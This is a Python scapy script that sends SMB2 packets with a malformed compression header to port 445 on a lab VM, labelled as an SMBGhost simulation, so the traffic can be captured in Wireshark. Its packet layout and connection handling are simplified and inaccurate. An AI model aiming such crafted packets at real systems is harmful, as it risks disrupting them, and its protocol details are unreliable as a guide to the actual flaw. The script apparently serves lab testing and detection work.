from scapy.all import *
import time

def create_malformed_smb_compression(target_ip):
    """
    Creates an SMB2 packet with malformed compression header
    IMPROVED VERSION - ensures payload is sent
    """
    print(f"[*] Creating malformed SMB compression packet for {target_ip}")
    
    # SMB2 Header (64 bytes total)
    smb2_header = (
        b"\xfe\x53\x4d\x42"      # Protocol ID: \xfeSMB (SMB2)
        b"\x40\x00"              # Structure size (64 bytes)
        b"\x00\x00"              # Credit charge
        b"\x00\x00\x00\x00"      # Status (NT_STATUS_SUCCESS)
        b"\x00\x00"              # Command: NEGOTIATE (0x0000)
        b"\x01\x00"              # Credits requested
        b"\x00\x00\x00\x00"      # Flags
        b"\x00\x00\x00\x00"      # Next command offset
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Message ID
        b"\x00\x00\x00\x00"      # Reserved/Process ID
        b"\x00\x00\x00\x00"      # Tree ID
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Session ID
        b"\x00" * 16             # Signature (16 bytes)
    )
    
    # MALFORMED compression transform header
    # This simulates the SMBGhost vulnerability
    malformed_compression = (
        b"\xfc\x53\x4d\x42"      # Compression Transform Header signature
        b"\x00\x00\x00\x00"      # OriginalCompressedSegmentSize (placeholder)
        b"\x01\x00"              # CompressionAlgorithm: LZNT1 (0x0001)
        b"\x00\x00"              # Flags
        b"\xff\xff\xff\xff"      # MALFORMED: Offset (0xFFFFFFFF triggers integer overflow)
    )
    
    # Combine payloads
    full_payload = smb2_header + malformed_compression
    
    print(f"[*] Payload size: {len(full_payload)} bytes")
    print(f"[*] First 20 bytes (hex): {full_payload[:20].hex()}")
    
    # IP layer
    ip = IP(dst=target_ip)
    
    # TCP layer - using PUSH+ACK flags to ensure data is sent
    tcp = TCP(
        sport=RandShort(), 
        dport=445, 
        flags="PA",  # Push + Ack
        seq=1000,
        ack=1
    )
    
    # Raw payload
    raw = Raw(load=full_payload)
    
    # Build complete packet
    packet = ip/tcp/raw
    
    return packet

def send_malformed_packets(target_ip, count=1):
    """
    Sends malformed SMB packets to target
    """
    print(f"\n{'='*60}")
    print(f"MALFORMED SMB PACKET GENERATOR")
    print(f"{'='*60}")
    print(f"Target: {target_ip}")
    print(f"Packets to send: {count}")
    print(f"{'='*60}\n")
    
    for i in range(count):
        print(f"\n[*] Sending packet {i+1}/{count}...")
        
        # Create packet
        packet = create_malformed_smb_compression(target_ip)
        
        # Show packet details
        print(f"\n[*] Packet structure:")
        packet.show()
        
        # Send packet
        print(f"\n[*] Sending...")
        send(packet, verbose=0)
        
        print(f"[✓] Packet {i+1} sent!")
        
        if i < count - 1:
            time.sleep(1)  # Wait 1 second between packets
    
    print(f"\n{'='*60}")
    print(f"[✓] All {count} packets sent successfully!")
    print(f"{'='*60}")

def send_normal_smb_for_comparison(target_ip):
    """
    Sends a normal (non-malformed) SMB packet for comparison
    """
    print(f"\n[*] Sending NORMAL SMB packet for comparison...")
    
    # Normal SMB2 NEGOTIATE (without malformed compression)
    normal_smb = (
        b"\xfe\x53\x4d\x42"      # Protocol ID
        b"\x40\x00"              # Structure size
        b"\x00\x00"              # Credit charge
        b"\x00\x00\x00\x00"      # Status
        b"\x00\x00"              # Command: NEGOTIATE
        b"\x01\x00"              # Credits
        b"\x00\x00\x00\x00"      # Flags
        b"\x00\x00\x00\x00"      # Next command
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Message ID
        b"\x00\x00\x00\x00"      # Process ID
        b"\x00\x00\x00\x00"      # Tree ID
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Session ID
        b"\x00" * 16             # Signature
    )
    
    packet = IP(dst=target_ip)/TCP(sport=RandShort(), dport=445, flags="PA")/Raw(load=normal_smb)
    send(packet, verbose=0)
    print(f"[✓] Normal packet sent")

# Main execution
if __name__ == "__main__":
    print("\n" + "="*60)
    print("SMBGhost Malformed Packet Test")
    print("="*60)
    
    # Configuration
    vulnerable_vm = "192.168.32.20"  # UPDATE THIS with your actual VM IP
    
    print(f"\n[!] Configuration:")
    print(f"    Target VM: {vulnerable_vm}")
    print(f"    Target Port: 445 (SMB)")
    print(f"\n[!] IMPORTANT:")
    print(f"    1. Make sure target VM is running")
    print(f"    2. Start Wireshark capture on target VM BEFORE continuing")
    print(f"    3. Filter in Wireshark: tcp.port == 445")
    print(f"\n")
    
    input("Press ENTER when Wireshark is ready on target VM...")
    
    # Send malformed packets
    send_malformed_packets(vulnerable_vm, count=3)
    
    # Send one normal packet for comparison
    send_normal_smb_for_comparison(vulnerable_vm)
    
    print(f"\n[!] Test complete!")
    print(f"[!] Now check Wireshark on the target VM")
    print(f"[!] You should see 4 packets to port 445")
    print(f"[!] Save the capture as 'vulnerable_test.pcapng'")